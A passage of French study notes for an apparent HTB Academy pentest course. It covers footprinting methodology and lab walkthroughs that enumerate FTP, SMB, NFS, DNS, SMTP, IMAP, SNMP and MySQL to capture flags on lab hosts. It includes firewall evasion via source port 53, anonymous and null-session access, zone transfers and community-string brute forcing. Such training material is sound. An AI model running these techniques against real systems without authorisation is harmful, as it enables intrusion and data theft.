<span class="nv">tunip</span><span class="o">=</span><span class="k">$(</span>ip<span class="w"> </span>-4<span class="w"> </span>addr<span class="w"> </span>show<span class="w"> </span>dev<span class="w"> </span>tun0<span class="w"> </span><span class="p">|</span><span class="w"> </span>awk<span class="w"> </span><span class="s1">'/inet/{print $2}'</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>cut<span class="w"> </span>-d/<span class="w"> </span>-f1<span class="k">)</span>
<span class="nb">printf</span><span class="w"> </span><span class="s1">'FEAT\r\nSYST\r\nQUIT\r\n'</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>sudo<span class="w"> </span>ncat<span class="w"> </span>-nv<span class="w"> </span>-s<span class="w"> </span><span class="s2">"</span><span class="nv">$tunip</span><span class="s2">"</span><span class="w"> </span>--source-port<span class="w"> </span><span class="m">53</span><span class="w"> </span><span class="s2">"</span><span class="nv">$target</span><span class="s2">"</span><span class="w"> </span><span class="m">50000</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>tee<span class="w"> </span><span class="s2">"</span><span class="nv">$out</span><span class="s2">/p50000.txt"</span>
</code></pre>
</div>
<p>Le module démontre que <strong>savoir dialoguer</strong> avec les services (bannières, verbes/protos, scripts NSE ciblés) et <strong>adapter</strong> les scans (timing/perf/évasion) fait passer de « rien ne répond » à « version/flag obtenu ».</p>
<p>Retiens <strong>trois réflexes</strong> :</p>
<ol>
<li><strong>NSE ciblé + lecture de bannière</strong> (souvent le flag est là).</li>
<li><strong>Évasion</strong> par <strong>ports source de confiance</strong> (<code>-source-port 53</code>) quand tout est « filtered ».</li>
<li><strong>Ne pas “forcer”</strong> : adapter timing/RTT/retries plutôt que multiplier les scans agressifs.</li>
</ol>
</div></details><details><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Footprinting</strong></summary><div class="indented"><h1><strong>Enumeration Principles</strong></h1>
<p>L’<strong>enumeration</strong> est la phase où l’on collecte activement des informations sur une cible (DNS, ports, services, technologies…).</p>
<p>Elle est différente de l’<strong>OSINT</strong>, qui repose uniquement sur la collecte passive.</p>
<p>On ne cherche pas “à entrer”, mais à <strong>comprendre comment entrer</strong>.</p>
<h3>Objectif réel de l’énumération</h3>
<p>Développer une vision globale de :</p>
<ul>
<li>l'infrastructure</li>
<li>les services exposés</li>
<li>les défenses</li>
<li>la logique technique derrière l’entreprise</li>
</ul>
<p>Cette étape conditionne tout le pentest.</p>
<p>Une erreur courante : brute-forcer trop tôt → <strong>bruit</strong>, <strong>blacklisting</strong>, <strong>perte de temps</strong>.</p>
<h3>Les questions fondamentales</h3>
<p><strong>Ce que nous voyons :</strong></p>
<ul>
<li>Qu’est-ce qui est exposé ?</li>
<li>Pourquoi est-ce visible ?</li>
<li>Comment l’utiliser ?</li>
</ul>
<p><strong>Ce que nous ne voyons pas :</strong></p>
<ul>
<li>Qu’est-ce qui devrait exister mais ne répond pas ?</li>
<li>Pourquoi ce n’est pas visible ?</li>
<li>Que révèle cette absence ?</li>
</ul>
<h3>Principes d’énumération</h3>
<table class="simple-table">
<thead>
<tr>
<th>Nº</th>
<th>Principe</th>
</tr>
</thead>
<tbody>
<tr>
<td>1</td>
<td>Il y a plus que ce que l’on voit. Toujours considérer plusieurs points de vue.</td>
</tr>
<tr>
<td>2</td>
<td>Distinguer ce qu’on voit de ce qu’on ne voit pas.</td>
</tr>
<tr>
<td>3</td>
<td>Il existe toujours un moyen d’obtenir plus d’informations. Comprendre la cible.</td>
</tr>
</tbody>
</table>
<p>Ces principes guident toutes les étapes suivantes.</p>
<h1><strong>Enumeration Methodology</strong></h1>
<p>L’énumération doit suivre une méthodologie <strong>statique</strong> (structure) mais <strong>adaptable</strong> (pratique).</p>
<p>HTB propose un modèle en <strong>6 couches</strong>, comparable à des murs successifs à franchir.</p>
<h3><strong>Les 6 couches d’énumération</strong></h3>
<table class="simple-table">
<thead>
<tr>
<th>Layer</th>
<th>Objectif</th>
<th>Informations</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>1. Internet Presence</strong></td>
<td>Identifier toute la surface exposée</td>
<td>Domaines, subdomains, ASN, IP, cloud</td>
</tr>
<tr>
<td><strong>2. Gateway</strong></td>
<td>Comprendre les protections</td>
<td>Firewall, proxies, IPS/IDS, segmentation</td>
</tr>
<tr>
<td><strong>3. Accessible Services</strong></td>
<td>Lister &amp; analyser tous les services accessibles</td>
<td>ports, versions, bannières, config</td>
</tr>
<tr>
<td><strong>4. Processes</strong></td>
<td>Comprendre ce que les services <em>font</em></td>
<td>tâches, flux, sources, destinations</td>
</tr>
<tr>
<td><strong>5. Privileges</strong></td>
<td>Comprendre les permissions internes</td>
<td>users, groupes, droits</td>
</tr>
<tr>
<td><strong>6. OS Setup</strong></td>
<td>Analyse post-compromission du système</td>
<td>OS, patchs, config, fichiers sensibles</td>
</tr>
</tbody>
</table>
<h3>Vision globale :</h3>
<p>Un pentest = un <strong>labyrinthe</strong></p>
<p>Chaque vulnérabilité = une <strong>ouverture</strong></p>
<p>Toutes les ouvertures ne mènent pas à l’intérieur → priorité au <strong>temps</strong> et à la <strong>pertinence</strong>.</p>
<h1><strong>Domain Information (Passive Recon)</strong></h1>
<p>Avant de scanner, on <strong>observe</strong> :</p>
<ul>
<li>site web principal</li>
<li>textes, services, technologies mentionnées</li>
<li>sous-domaines</li>
<li>prestataires</li>
<li>cloud</li>
<li>mails</li>
<li>certificats SSL</li>
</ul>
<h2>Analyse du certificat SSL</h2>
<p>Exemple :</p>
<div class="codehilite"><pre><code>inlanefreight.htb
www.inlanefreight.htb
support.inlanefreight.htb

</code></pre></div>
<p>Les certificats montrent souvent :</p>
<ul>
<li>des sous-domaines oubliés</li>
<li>des environnements de staging</li>
<li>des services internes exposés par erreur</li>
</ul>
<h2>Certificate Transparency (crt.sh)</h2>
<p>Recherche automatisée :</p>
<div class="codehilite">
<pre><span></span><code>curl<span class="w"> </span>-s<span class="w"> </span>https://crt.sh/?q<span class="o">=</span>inlanefreight.com<span class="p">&amp;</span><span class="nv">output</span><span class="o">=</span>json<span class="w"> </span><span class="p">|</span><span class="w"> </span>jq<span class="w"> </span>.
</code></pre>
</div>
<p>Puis extraction des subdomains uniques :</p>
<div class="codehilite">
<pre><span></span><code>curl<span class="w"> </span>-s<span class="w"> </span>https://crt.sh/?q<span class="o">=</span>inlanefreight.com<span class="p">&amp;</span><span class="nv">output</span><span class="o">=</span>json<span class="w"> </span><span class="se">\</span>
<span class="p">|</span><span class="w"> </span>jq<span class="w"> </span>.<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>name<span class="w"> </span><span class="p">|</span><span class="w"> </span>cut<span class="w"> </span>-d<span class="s2">":"</span><span class="w"> </span>-f2<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-v<span class="w"> </span><span class="s2">"CN="</span><span class="w"> </span><span class="se">\</span>
<span class="p">|</span><span class="w"> </span>cut<span class="w"> </span>-d<span class="s1">'"'</span><span class="w"> </span>-f2<span class="w"> </span><span class="p">|</span><span class="w"> </span>tr<span class="w"> </span><span class="s1">'\\n'</span><span class="w"> </span><span class="s1">'\n'</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>sort<span class="w"> </span>-u
</code></pre>
</div>
<p>→ liste complète de sous-domaines pour brute-forcing / vhost bruteforcing.</p>
<h2>Résolution DNS + identification des hôtes internes</h2>
<div class="codehilite">
<pre><span></span><code><span class="k">for</span><span class="w"> </span>i<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="k">$(</span>cat<span class="w"> </span>subdomainlist<span class="k">)</span><span class="p">;</span><span class="w"> </span><span class="k">do</span>
<span class="w">    </span>host<span class="w"> </span><span class="nv">$i</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span><span class="s2">"has address"</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>inlanefreight.com<span class="w"> </span><span class="p">|</span><span class="w"> </span>cut<span class="w"> </span>-d<span class="s2">" "</span><span class="w"> </span>-f1,4
<span class="k">done</span>
</code></pre>
</div>
<p>On identifie :</p>
<ul>
<li>les IP <strong>hébergées par l’entreprise</strong></li>
<li>les IP <strong>hébergées par des tiers (à exclure du test)</strong></li>
</ul>
<h2>Analyse Shodan automatisée</h2>
<div class="codehilite">
<pre><span></span><code><span class="k">for</span><span class="w"> </span>i<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="k">$(</span>cat<span class="w"> </span>ip-addresses.txt<span class="k">)</span><span class="p">;</span><span class="w"> </span><span class="k">do</span><span class="w"> </span>shodan<span class="w"> </span>host<span class="w"> </span><span class="nv">$i</span><span class="p">;</span><span class="w"> </span><span class="k">done</span>
</code></pre>
</div>
<p>Cela révèle :</p>
<ul>
<li>services exposés</li>
<li>bannières</li>
<li>versions vulnérables</li>
<li>SSL/TLS weak ciphers</li>
<li>OS fingerprinting</li>
</ul>
<h2>Analyse DNS approfondie</h2>
<div class="codehilite">
<pre><span></span><code>dig<span class="w"> </span>any<span class="w"> </span>inlanefreight.com
</code></pre>
</div>
<p>À surveiller :</p>
<h3>TXT records → mine d’information</h3>
<p>Exemples réels trouvés :</p>
<ul>
<li>atlassian-domain-verification → Atlassian utilisé</li>
<li>google-site-verification → GSuite / Cloud</li>
<li>logmein-verification → accès distant</li>
<li>SPF/DMARC → sources mail autorisées</li>
<li>IP internes supplémentaires</li>
</ul>
<p>→ Ces données suggèrent technologies internes et prestataires.</p>
<h1><strong>Cloud Resources</strong></h1>
<p>Les entreprises exposent involontairement des ressources cloud :</p>
<ul>
<li><strong>AWS S3</strong></li>
<li><strong>Azure Blob</strong></li>
<li><strong>Google Cloud Storage</strong></li>
</ul>
<h2>Identifier les buckets via DNS</h2>
<p>Exemple dans la zone DNS :</p>
<div class="codehilite"><pre><code>s3-website-us-west-2.amazonaws.com

</code></pre></div>
<h2>Google Dorks pour cloud leaks</h2>
<p>AWS :</p>
<div class="codehilite"><pre><code>intext:"companyname" inurl:amazonaws.com

</code></pre></div>
<p>Azure :</p>
<div class="codehilite"><pre><code>intext:"companyname" inurl:blob.core.windows.net

</code></pre></div>
<p>GCP :</p>
<div class="codehilite"><pre><code>intext:"companyname" inurl:storage.googleapis.com

</code></pre></div>
<h2>GrayHatWarfare</h2>
<p>Très puissant :</p>
<p>Recherche par nom → affiche fichiers accessibles (images, docs, <strong>SSH keys</strong>, backups…)</p>
<p>Exemple critique observé :</p>
<div class="codehilite"><pre><code>id_rsa
id_rsa.pub

</code></pre></div>
<p>→ Compromission totale en cas de clé privée exposée.</p>
<h1><strong>Staff OSINT</strong></h1>
<p>Analyser les employés = comprendre <strong>l’infrastructure technique interne</strong>.</p>
<p>Sources :</p>
<ul>
<li>LinkedIn</li>
<li>GitHub</li>
<li>Job posts</li>
<li>Conférences / talks</li>
<li>CVs / portfolios</li>
</ul>
<h3>Informations utiles :</h3>
<p>✔ langages utilisés</p>
<p>✔ frameworks internes</p>
<p>✔ solutions cloud</p>
<p>✔ outils CI/CD</p>
<p>✔ versions vulnérables mentionnées</p>
<p>✔ intérêts récents (ex : Kubernetes, Flask, etc.)</p>
<h3>Exemple tiré du module :</h3>
<p>Un employé publie un code contenant :</p>
<ul>
<li>son email personnel</li>
<li>un <strong>JWT hardcodé</strong></li>
</ul>
<p>Un autre annonce maîtriser :</p>
<ul>
<li>Django → chercher erreurs de config</li>
<li>Flask → secrets faibles</li>
<li>React/Angular → risques XSS</li>
<li>Kafka/Elastic → ports internes exposés</li>
</ul>
<p>Les offres d’emploi révèlent :</p>
<ul>
<li>bases utilisées : PostgreSQL, SQL Server, Oracle</li>
<li>frameworks : Spring, ASP.NET, Django</li>
<li>environnements cloud : Azure, AWS</li>
<li>outils dev : Jira, Bitbucket</li>
</ul>
<p>C’est une <strong>carte technique interne gratuite</strong>.</p>
<p><figure class="image"><a href="../static/image/cjca/enum-method33.png"><img alt="" src="../static/image/cjca/enum-method33.png"/></a></figure></p>
<h2>FTP – version &amp; <code>flag.txt</code></h2>
<h3>Trouver la version (bannière complète)</h3>
<p>Scan rapide du port FTP (adapté à <em>ton</em> IP cible) :</p>
<div class="codehilite">
<pre><span></span><code>nmap<span class="w"> </span>-sV<span class="w"> </span>-sC<span class="w"> </span>-p21<span class="w"> </span>&lt;IP_cible&gt;
</code></pre>
</div>
<ul>
<li><p>Dans la section <code>21/tcp open ftp ...</code> tu verras un truc du style :</p>
<div class="codehilite"><pre><code>21/tcp open ftp vsftpd 3.0.3

</code></pre></div></li>
<li><p>Ou bien, pour avoir exactement la bannière :</p></li>
</ul>
<p>Connexion directe :</p>
<div class="codehilite">
<pre><span></span><code>nc<span class="w"> </span>-nv<span class="w"> </span>&lt;IP_cible&gt;<span class="w"> </span><span class="m">21</span>
<span class="c1"># ou</span>
telnet<span class="w"> </span>&lt;IP_cible&gt;<span class="w"> </span><span class="m">21</span>
</code></pre>
</div>
<p>Tu verras une ligne du genre :</p>
<div class="codehilite"><pre><code>220 "Welcome to the HTB Academy vsFTP service."

</code></pre></div>
<h3>Se connecter &amp; trouver <code>flag.txt</code></h3>
<p>Test du login anonyme :</p>
<div class="codehilite">
<pre><span></span><code>ftp<span class="w"> </span>&lt;IP_cible&gt;
<span class="c1"># username : anonymous</span>
<span class="c1"># password : (Entrée)</span>
</code></pre>
</div>
<p>Liste des fichiers :</p>
<div class="codehilite"><pre><code>ftp&gt; ls
ftp&gt; ls -R          # si besoin de récursif

</code></pre></div>
<p>Cherche un fichier <code>flag.txt</code> :</p>
<ul>
<li>Il peut être dans le dossier courant ou dans un sous-dossier (<code>Clients</code>, <code>Documents</code>, etc.)</li>
</ul>
<p>Télécharger le flag :</p>
<div class="codehilite"><pre><code>ftp&gt; get flag.txt
ftp&gt; exit

</code></pre></div>
<p>Lire le contenu :</p>
<div class="codehilite">
<pre><span></span><code>cat<span class="w"> </span>flag.txt
</code></pre>
</div>
<h2>SMB – version, partage, domaine, infos &amp; flag</h2>
<h3>Version du serveur SMB (bannière complète)</h3>
<p>Scan :</p>
<div class="codehilite">
<pre><span></span><code>nmap<span class="w"> </span>-sV<span class="w"> </span>-sC<span class="w"> </span>-p139,445<span class="w"> </span>&lt;IP_cible&gt;
</code></pre>
</div>
<p>Tu verras quelque chose comme :</p>
<div class="codehilite"><pre><code>139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2

</code></pre></div>
<h3>Nom du partage accessible + <code>flag.txt</code></h3>
<p>Lister les partages avec <code>smbclient</code> (null session) :</p>
<div class="codehilite">
<pre><span></span><code>smbclient<span class="w"> </span>-N<span class="w"> </span>-L<span class="w"> </span>//&lt;IP_cible&gt;
</code></pre>
</div>
<p>Tu obtiens :</p>
<div class="codehilite"><pre><code>Sharename       Type      Comment
---------       ----      -------
notes           Disk      CheckIT
...

</code></pre></div>
<p>Le partage qui t’intéresse est celui où tu as accès (souvent un <code>Disk</code> avec <code>guest ok</code>).</p>
<p>Se connecter au partage :</p>
<div class="codehilite">
<pre><span></span><code>smbclient<span class="w"> </span>//&lt;IP_cible&gt;/&lt;sharename&gt;
<span class="c1"># soit il te demande un mot de passe, soit "Anonymous login successful"</span>
</code></pre>
</div>
<p>Lister &amp; récupérer <code>flag.txt</code> :</p>
<div class="codehilite"><pre><code>smb: \&gt; ls
smb: \&gt; get flag.txt
smb: \&gt; exit

</code></pre></div>
<p>Lire le flag :</p>
<div class="codehilite">
<pre><span></span><code>cat<span class="w"> </span>flag.txt
</code></pre>
</div>
<h3>Domaine, infos de partage, chemin système</h3>
<h3>Domaine &amp; infos du serveur</h3>
<p><code>rpcclient</code> en null session :</p>
<div class="codehilite">
<pre><span></span><code>rpcclient<span class="w"> </span>-U<span class="w"> </span><span class="s2">""</span><span class="w"> </span>&lt;IP_cible&gt;
<span class="c1"># password : (juste Entrée)</span>
</code></pre>
</div>
<p>Infos serveur :</p>
<div class="codehilite"><pre><code>rpcclient $&gt; srvinfo
rpcclient $&gt; querydominfo

</code></pre></div>
<p>Ça te donne un truc du style :</p>
<div class="codehilite"><pre><code>Domain:         DEVOPS
Server:         DEVSMB

</code></pre></div>
<p>Le <strong>nom de domaine</strong> demandé = ce champ <code>Domain:</code>.</p>
<h3>Infos détaillées sur un partage spécifique</h3>
<p>Toujours dans <code>rpcclient</code> :</p>
<div class="codehilite"><pre><code>rpcclient $&gt; netshareenumall
rpcclient $&gt; netsharegetinfo &lt;sharename&gt;

</code></pre></div>
<p>Tu verras quelque chose comme :</p>
<div class="codehilite"><pre><code>netname: notes
        remark: CheckIT
        path:   C:\mnt\notes\
        ...

</code></pre></div>
<ul>
<li><em>“Submit the customized version of that specific share”</em> → en général, on te demande de renvoyer <strong>exactement</strong> une ligne/structure particulière (souvent ce bloc <code>netsharegetinfo</code> ou un champ spécifique, suivant le texte du lab).</li>
<li><em>“Full system path”</em> → tu prends le <code>path</code>, que tu convertis au format Unix <strong>si demandé</strong>.
<ul>
<li>Exemple : <code>C:\mnt\notes\</code> ⇒ <code>/mnt/notes</code></li>
</ul></li>
</ul>
<p>👉 Réponses :</p>
<ul>
<li>Domaine = valeur du champ <code>Domain</code>.</li>
<li>Détails du partage = ce que <code>netsharegetinfo</code> t’affiche.</li>
<li>Chemin système = ce <code>path</code>, adapté au format demandé.</li>
</ul>
<h2>NFS – trouver les flags dans <code>nfs</code> &amp; <code>nfsshare</code></h2>
<h3>Énumérer NFS</h3>
<p>Nmap :</p>
<div class="codehilite">
<pre><span></span><code>nmap<span class="w"> </span>-sV<span class="w"> </span>-sC<span class="w"> </span>-p111,2049<span class="w"> </span>&lt;IP_cible&gt;
</code></pre>
</div>
<p>Lister les exports :</p>
<div class="codehilite">
<pre><span></span><code>showmount<span class="w"> </span>-e<span class="w"> </span>&lt;IP_cible&gt;
</code></pre>
</div>
<p>Tu cherches des lignes du style :</p>
<div class="codehilite"><pre><code>/mnt/nfs     10.129.14.0/24
/mnt/nfsshare 10.129.14.0/24

</code></pre></div>
<h3>Monter les partages &amp; lire <code>flag.txt</code></h3>
<p>Crée un dossier de montage :</p>
<div class="codehilite">
<pre><span></span><code>mkdir<span class="w"> </span>nfs
sudo<span class="w"> </span>mount<span class="w"> </span>-t<span class="w"> </span>nfs<span class="w"> </span>&lt;IP_cible&gt;:/nfs<span class="w"> </span>./nfs<span class="w"> </span>-o<span class="w"> </span>nolock<span class="w">     </span><span class="c1"># ou /mnt/nfs selon l'export</span>
</code></pre>
</div>
<p>Explore :</p>
<div class="codehilite">
<pre><span></span><code><span class="nb">cd</span><span class="w"> </span>nfs
ls<span class="w"> </span>-R
cat<span class="w"> </span>flag.txt
</code></pre>
</div>
<p>Pour <code>nfsshare</code> :</p>
<div class="codehilite">
<pre><span></span><code><span class="nb">cd</span><span class="w"> </span>..
mkdir<span class="w"> </span>nfsshare
sudo<span class="w"> </span>mount<span class="w"> </span>-t<span class="w"> </span>nfs<span class="w"> </span>&lt;IP_cible&gt;:/nfsshare<span class="w"> </span>./nfsshare<span class="w"> </span>-o<span class="w"> </span>nolock
<span class="nb">cd</span><span class="w"> </span>nfsshare
ls<span class="w"> </span>-R
cat<span class="w"> </span>flag.txt
</code></pre>
</div>
<p>Nettoyage :</p>
<div class="codehilite">
<pre><span></span><code><span class="nb">cd</span><span class="w"> </span>..
sudo<span class="w"> </span>umount<span class="w"> </span>./nfs<span class="w"> </span>./nfsshare
</code></pre>
</div>
<h2>DNS – FQDN, zone transfer, IP de DC1, host x.x.x.203</h2>
<p>On suppose que la machine cible est un DNS pour <code>inlanefreight.htb</code>.</p>
<h3>FQDN de la cible pour le domaine</h3>
<p>Si tu connais l’IP du DNS (ex: <code>&lt;IP_DNS&gt;</code>):</p>
<div class="codehilite">
<pre><span></span><code>dig<span class="w"> </span>-x<span class="w"> </span>&lt;IP_DNS&gt;<span class="w"> </span>@&lt;IP_DNS&gt;
</code></pre>
</div>
<p>Ou :</p>
<div class="codehilite">
<pre><span></span><code>dig<span class="w"> </span>any<span class="w"> </span>inlanefreight.htb<span class="w"> </span>@&lt;IP_DNS&gt;
</code></pre>
</div>
<p>Tu cherches le <strong>nom complet</strong> (FQDN) associé à l’IP de la cible, ex. <code>ns.inlanefreight.htb</code>.</p>
<h3>Zone transfer &amp; TXT (HTB{...})</h3>
<p>Test AXFR sur le domaine principal :</p>
<div class="codehilite">
<pre><span></span><code>dig<span class="w"> </span>axfr<span class="w"> </span>inlanefreight.htb<span class="w"> </span>@&lt;IP_DNS&gt;
</code></pre>
</div>
<p>Si la zone transfer est autorisée, tu verras :</p>
<ul>
<li>SOA</li>
<li>NS</li>
<li>A</li>
<li>TXT (avec un <code>HTB{...}</code>)</li>
</ul>
<p>👉 Tu soumets <strong>exactement</strong> le TXT de type <code>HTB{...}</code>.</p>
<h3>IP de <code>DC1</code></h3>
<p>Si la zone transfer marche déjà, tu la verras dans la sortie précédente. Sinon :</p>
<div class="codehilite">
<pre><span></span><code>dig<span class="w"> </span>dc1.inlanefreight.htb<span class="w"> </span>@&lt;IP_DNS&gt;
</code></pre>
</div>
<p>Tu récupères :</p>
<div class="codehilite"><pre><code>dc1.inlanefreight.htb.  IN  A  x.x.x.x

</code></pre></div>
<p>👉 Tu soumets cette IPv4.</p>
<h3>FQDN dont l’IP finit par <code>.203</code></h3>
<p>Si tu as fait un AXFR sur une zone interne (par ex.) :</p>
<div class="codehilite">
<pre><span></span><code>dig<span class="w"> </span>axfr<span class="w"> </span>internal.inlanefreight.htb<span class="w"> </span>@&lt;IP_DNS&gt;
</code></pre>
</div>
<p>Tu cherches dans la sortie :</p>
<div class="codehilite"><pre><code>XXX.internal.inlanefreight.htb.  IN  A  x.x.x.203

</code></pre></div>
<p>👉 Tu soumets ce <strong>FQDN complet</strong> (ex: <code>mail1.internal.inlanefreight.htb</code> si c’est le cas chez toi).</p>
<h2>SMTP – bannière &amp; user existant</h2>
<h3>Bannière + version</h3>
<p>Scan Nmap :</p>
<div class="codehilite">
<pre><span></span><code>nmap<span class="w"> </span>-sV<span class="w"> </span>-sC<span class="w"> </span>-p25<span class="w"> </span>&lt;IP_cible&gt;
</code></pre>
</div>
<p>Tu verras :</p>
<div class="codehilite"><pre><code>25/tcp open  smtp  Postfix smtpd
|_smtp-commands: mail1.inlanefreight.htb, ...

</code></pre></div>
<p>Pour la bannière brute :</p>
<div class="codehilite">
<pre><span></span><code>nc<span class="w"> </span>-nv<span class="w"> </span>&lt;IP_cible&gt;<span class="w"> </span><span class="m">25</span>
<span class="c1"># ou</span>
telnet<span class="w"> </span>&lt;IP_cible&gt;<span class="w"> </span><span class="m">25</span>
</code></pre>
</div>
<p>Tu obtiens :</p>
<div class="codehilite"><pre><code>220 ESMTP Server

</code></pre></div>
<h3>Enum user avec <code>VRFY</code></h3>
<p>Connexion :</p>
<div class="codehilite">
<pre><span></span><code>telnet<span class="w"> </span>&lt;IP_cible&gt;<span class="w"> </span><span class="m">25</span>
<span class="c1"># ou</span>
nc<span class="w"> </span>-nv<span class="w"> </span>&lt;IP_cible&gt;<span class="w"> </span><span class="m">25</span>
</code></pre>
</div>
<p>Puis :</p>
<div class="codehilite"><pre><code>220 ESMTP Server
HELO test
250 ...
VRFY root
VRFY bob
VRFY cry0l1t3

</code></pre></div>
<ul>
<li>Si le serveur est “honnête”, il renverra une réponse différente pour un user existant (ex : <code>252 2.0.0</code> ou <code>250 2.1.5</code>) / ou une erreur pour ceux qui n’existent pas.</li>
<li>Si tous renvoient la même chose (comme dans l’exemple du cours), la question du lab te guidera souvent vers <strong>un user précis trouvé ailleurs</strong> (par exemple via d’autres services).</li>
</ul>
<h2>IMAP / POP3 (Dovecot)</h2>
<h3>Objectifs des questions</h3>
<ul>
<li>Organisation (subject du certificat)</li>
<li>FQDN du serveur mail</li>
<li>Enum IMAP pour trouver un flag</li>
<li>Version personnalisée POP3 / IMAP</li>
<li>Admin email</li>
<li>Lire les mails (flag)</li>
</ul>
<h3>Méthode</h3>
<p><strong>Scan Nmap des ports mail</strong></p>
<div class="codehilite">
<pre><span></span><code>nmap<span class="w"> </span>-sV<span class="w"> </span>-sC<span class="w"> </span>-p110,143,993,995<span class="w"> </span>&lt;IP&gt;
</code></pre>
</div>
<p>Tu récupères :</p>
<ul>
<li>Service (Dovecot imapd / pop3d)</li>
<li>Certificat SSL (CN, O, L, ST, C)
<ul>
<li>L’organisation = champ <code>O=...</code></li>
<li>Le FQDN = champ <code>CN=...</code> (ex: <code>mail1.inlanefreight.htb</code>)</li>
</ul></li>
</ul>
<p><strong>Tester les identifiants trouvés (robin:robin)</strong></p>
<p>Tu peux tester rapidement avec <strong>curl</strong> sur IMAPS (993) :</p>
<div class="codehilite">
<pre><span></span><code>curl<span class="w"> </span>-k<span class="w"> </span><span class="s1">'imaps://&lt;IP&gt;'</span><span class="w"> </span>--user<span class="w"> </span>robin:robin
</code></pre>
</div>
<p>Si ça marche, tu verras la liste des dossiers (<code>INBOX</code>, <code>Important</code>, etc.).</p>
<p>Avec <code>-v</code>, tu vois aussi la bannière (version/custom name) :</p>
<div class="codehilite">
<pre><span></span><code>curl<span class="w"> </span>-k<span class="w"> </span><span class="s1">'imaps://&lt;IP&gt;'</span><span class="w"> </span>--user<span class="w"> </span>robin:robin<span class="w"> </span>-v
</code></pre>
</div>
<p><strong>Interaction en mode “raw” avec openssl</strong></p>
<p>IMAPS :</p>
<div class="codehilite">
<pre><span></span><code>openssl<span class="w"> </span>s_client<span class="w"> </span>-connect<span class="w"> </span>&lt;IP&gt;:993
</code></pre>
</div>
<p>Une fois le banner reçu, tu peux taper les commandes IMAP à la main :</p>
<div class="codehilite"><pre><code>A1 LOGIN robin robin
A2 LIST "" *
A3 SELECT INBOX
A4 FETCH 1 all

</code></pre></div>
<ul>
<li>En fouillant les mails, tu tombes normalement sur un <strong>flag</strong>.</li>
<li>La <strong>version custom POP3/IMAP</strong> se trouve souvent dans la bannière (ou dans “Server:” côté client).</li>
</ul>
<ol>
<li><strong>Admin email</strong></li>
</ol>
<p>Souvent visible :</p>
<ul>
<li>dans le certificat (<code>emailAddress=...</code>)</li>
<li>ou dans un mail dans la boîte (signature, From, etc.).</li>
</ul>
<h2>SNMP</h2>
<h3>Objectifs</h3>
<ul>
<li>Email de l’admin</li>
<li>Version custom du serveur SNMP</li>
<li>Sortie d’un script custom (flag)</li>
</ul>
<h3>Méthode</h3>
<ol>
<li><strong>Tester le community string “public”</strong></li>
</ol>
<div class="codehilite">
<pre><span></span><code>snmpwalk<span class="w"> </span>-v2c<span class="w"> </span>-c<span class="w"> </span>public<span class="w"> </span>&lt;IP&gt;
</code></pre>
</div>
<p>Regarde particulièrement les OIDs de base système (<code>.1.3.6.1.2.1.1</code>), par exemple :</p>
<ul>
<li><code>sysContact</code> → souvent l’<strong>email admin</strong></li>
<li><code>sysDescr</code> ou autres → peut contenir une <strong>version custom</strong> ou une chaîne modifiée</li>
</ul>
<ol>
<li><strong>Bruteforce de community strings (si “public” ne marche pas)</strong></li>
</ol>
<div class="codehilite">
<pre><span></span><code>onesixtyone<span class="w"> </span>-c<span class="w"> </span>/opt/useful/seclists/Discovery/SNMP/snmp.txt<span class="w"> </span>&lt;IP&gt;
</code></pre>
</div>
<p><strong>Bruteforce des OID avec braa</strong></p>
<div class="codehilite">
<pre><span></span><code>braa<span class="w"> </span>public@&lt;IP&gt;:.1.3.6.*
</code></pre>
</div>
<p>Tu cherches :</p>
<ul>
<li>un OID qui renvoie une <strong>version custom</strong></li>
<li>un OID qui renvoie la sortie d’un <strong>script custom</strong> (souvent quelque chose qui ressemble à un message ou directement un <code>HTB{...}</code>).</li>
</ul>
<h2>MySQL</h2>
<h3>Objectifs</h3>
<ul>
<li>Version du MySQL (<code>MySQL X.X.XX</code>)</li>
<li>Avec <code>robin:robin</code>, récupérer l’email de <strong>Otto Lang</strong></li>
</ul>
<h3>Méthode</h3>
<p><strong>Scan Nmap MySQL</strong></p>
<div class="codehilite">
<pre><span></span><code>nmap<span class="w"> </span>-sV<span class="w"> </span>-sC<span class="w"> </span>-p3306<span class="w"> </span>&lt;IP&gt;<span class="w"> </span>--script<span class="w"> </span>mysql*
</code></pre>
</div>
<p>Tu verras :</p>
<ul>
<li>la <strong>version</strong> (<code>mysql-info</code> → <code>Version: 8.0.xx-...</code>)
<ul>
<li>Formate-la comme demandé : <code>MySQL X.X.XX</code></li>
</ul></li>
</ul>
<p><strong>Connexion avec les creds robin:robin</strong></p>
<div class="codehilite">
<pre><span></span><code>mysql<span class="w"> </span>-u<span class="w"> </span>robin<span class="w"> </span>-probin<span class="w"> </span>-h<span class="w"> </span>&lt;IP&gt;
</code></pre>
</div>
<p><strong>Enumération des bases</strong></p>
<div class="codehilite">
<pre><span></span><code><span class="k">SHOW</span><span class="w"> </span><span class="n">DATABASES</span><span class="p">;</span>
<span class="n">USE</span><span class="w"> </span><span class="o">&lt;</span><span class="n">db_interessante</span><span class="o">&gt;</span><span class="p">;</span>
<span class="k">SHOW</span><span class="w"> </span><span class="n">TABLES</span><span class="p">;</span>
</code></pre>
</div>
<p><strong>Trouver Otto Lang</strong></p>
<p>Repère une table qui ressemble à des users/clients (ex : <code>customers</code>, <code>users</code>, etc.), regarde la structure, puis :</p>
<div class="codehilite">
<pre><span></span><code><span class="k">SHOW</span><span class="w"> </span><span class="n">COLUMNS</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="o">&lt;</span><span class="k">table</span><span class="o">&gt;</span><span class="p">;</span>
